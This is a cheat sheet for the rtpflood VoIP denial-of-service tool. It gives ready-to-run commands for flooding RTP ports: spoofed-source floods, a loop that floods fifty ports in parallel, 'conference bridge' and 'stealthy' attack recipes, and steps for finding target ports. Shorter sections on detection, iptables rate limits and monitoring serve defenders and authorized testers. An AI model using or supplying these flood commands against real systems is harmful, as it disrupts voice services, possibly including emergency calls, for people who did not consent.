# RTP Flood Quick Reference

## Installation

```bash
sudo apt install rtpflood
```

## Basic Syntax

```bash
rtpflood [options] <target_ip> <target_port>
```

## Basic Commands

| Command | Description |
|---------|-------------|
| `sudo rtpflood 192.168.1.100 10000` | Basic RTP flood |
| `sudo rtpflood -l 320 192.168.1.100 10000` | Custom packet size |
| `sudo rtpflood -c 10000 192.168.1.100 10000` | Limited packet count |
| `sudo rtpflood -i 10.0.0.1 192.168.1.100 10000` | Spoofed source |
| `sudo rtpflood -v 192.168.1.100 10000` | Verbose output |
| `sudo rtpflood -d 1000 192.168.1.100 10000` | Delayed flood |

## Options Reference

```
-i IP       # Source IP (spoof)
-s PORT     # Source port (default: random)
-l BYTES    # Packet length (default: 160)
-c COUNT    # Packet count (default: unlimited)
-d USEC     # Delay between packets
-t NUM      # TOS value
-v          # Verbose mode
-h          # Help
```

## Quick Scenarios

### Single Call Disruption
```bash
# Find RTP port
tcpdump -i eth0 -n udp portrange 10000-20000
# Flood it
sudo rtpflood 192.168.1.100 10000
```

### Conference Bridge Attack
```bash
sudo rtpflood 192.168.1.200 10001
sudo rtpflood 192.168.1.200 10002
```

### Port Range Attack
```bash
for port in $(seq 10000 10050); do
    sudo rtpflood 192.168.1.100 $port &
done
```

### Stealthy Attack
```bash
sudo rtpflood -d 5000 -c 1000 192.168.1.100 10000
```

## RTP Port Ranges

| Range | Common Use |
|-------|------------|
| 10000-20000 | Asterisk/FreeSWITCH |
| 16384-32767 | Some SIP proxies |
| 5004-5005 | SIP default |

## Detection Indicators

- High UDP traffic to RTP ports
- Single source flooding multiple ports
- Packet rate anomaly
- Voice quality degradation

## Defense Quick Fixes

```bash
# Rate limit RTP (iptables)
iptables -A INPUT -p udp --dport 10000-20000 -m limit --limit 1000/s -j ACCEPT
iptables -A INPUT -p udp --dport 10000-20000 -j DROP

# Limit connections
iptables -A INPUT -p udp --dport 10000-20000 -m connlimit --connlimit-above 50 -j DROP
```

## Monitor Commands

```bash
# Watch RTP traffic
tcpdump -i eth0 -n udp portrange 10000-20000

# Asterisk RTP stats
asterisk -rx "rtp show stats"

# Active calls
asterisk -rx "core show channels"
```

## Quality Metrics

| Metric | Normal | Under Attack |
|--------|--------|--------------|
| MOS | 4.0+ | 1.0-2.0 |
| Jitter | <30ms | >100ms |
| Loss | <1% | >10% |

## System Requirements

- Root/sudo privileges
- Access to target network
- libnet9 installed
- Promiscuous mode NIC

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Permission denied | Run with `sudo` |
| No RTP traffic | Monitor with tcpdump |
| Low packet rate | Check network interface |
| Wrong port | Identify with netstat |

## Legal Reminder

**Authorized testing only!** RTP Flood disrupts voice services. Always obtain written permission before testing.
